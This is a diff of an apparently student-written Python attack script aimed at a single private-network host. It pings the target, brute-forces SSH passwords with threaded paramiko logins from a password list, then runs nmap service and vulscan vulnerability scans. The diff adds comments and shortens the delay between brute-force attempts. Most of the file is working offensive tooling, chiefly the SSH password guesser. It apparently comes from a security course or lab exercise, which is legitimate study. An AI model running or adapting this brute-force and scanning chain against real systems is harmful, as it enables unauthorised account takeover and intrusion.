@@ -1,5 +1,14 @@
 #First implementation - Dragan Butkovic -P2408503
 
+# IMPORTANT NOTE: Install Python PIP on Linux for a package management systems that simplifies installation 
+# and mangement of software packages written in Python such as those found in the Python pacakage index (PyPI). 
+# Pip is not installed by default on Ubuntu 18.04, but the installation is pretty straightforward.
+
+# SHOULD INSTALL PIP and PIP PACKAGES 
+# sudo apt install python3-pip
+# sudo pip3 install termcolor
+# sudo pip3 install paramiko
+
 #1. fping
 #2. SSH-Brute-Force
 #3. NSE ports scan
@@ -14,6 +23,7 @@ from termcolor import colored
 
 #-------------------------------------------------FPing---------------------------------------------------------------#
 
+#Perform the ping using the system ping the host (victims) (15 ping only) 
 os.system('ping 192.168.253.136 -c 15')
 print("pfing Done!")
 
@@ -47,7 +57,7 @@ def ssh_connect(password, code=0):
     print(colored(f"\n[+]SSH Password For {username} found :> {password}    {hammer}\n", "red", attrs=['bold']))
     os.system(f"notify-send 'Password Found::{password}'")
   except:
-    print(colored(f"[!]Incorrect SSH password:> {password}", 'green'))
+    print(colored(f"[!]Incorrect SSH password:> {password}", 'red'))
   ssh.close()
 
   ssh.close()
@@ -69,23 +79,27 @@ with open(password_file, 'r') as file:
     t = threading.Thread(target=ssh_connect, args=(password,))
     t.start()
     #starting threading on ssh_connect function which takes only one argument of password...
-    time.sleep(0.5)
+    time.sleep(0.3)
     #time in seconds between each successive thread//Don't change it unless very neccessary...!
     #Lowering this time value may cause some errors......!
 
 print("Brute-Force-SHH_Completed")
 #-------------------------------------------------NSE-port-scan----------------------------------------------------#
 
+#Executing Nmap script to scan for Open ports from the host
 os.system('nmap -sV 192.168.253.136')
 print("NSE Done!")
 
 #-------------------------------------------------NSE-vulnerability-scan-------------------------------------------#
 
+#installing the vulscan script from git clone https://github.com/mrxdragan95/CTEC3451_2021_520_Development-Project.git
 def vulscan():
     os.system('ln -s `pwd`/vulscan /usr/share/nmap/scripts/vulscan')
     print("Moving_to_Script-Vulscan.nse")
 
+    
 vulscan()
+#Executing Nmap vulnerability scan using NSE scripts from the host  
 os.system('nmap -sV --script=vulscan/vulscan.nse 192.168.253.136')
 
 print("NSE vulnerability Done!")
